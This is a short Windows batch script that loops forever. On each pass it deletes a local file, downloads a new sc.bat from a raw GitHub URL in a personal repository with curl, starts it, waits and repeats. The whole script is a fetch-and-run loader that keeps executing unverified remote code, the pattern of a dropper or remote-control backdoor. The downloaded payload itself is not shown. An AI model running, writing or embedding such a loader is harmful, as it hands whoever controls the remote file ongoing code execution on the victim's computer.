@echo off
:a
del sc.bat
curl https://raw.githubusercontent.com/SeduHome/Test/main/sc.bat>sc.bat
timeout /t 1 /nobreak >nul
start sc.bat
timeout /t 8 /nobreak >nul
goto a
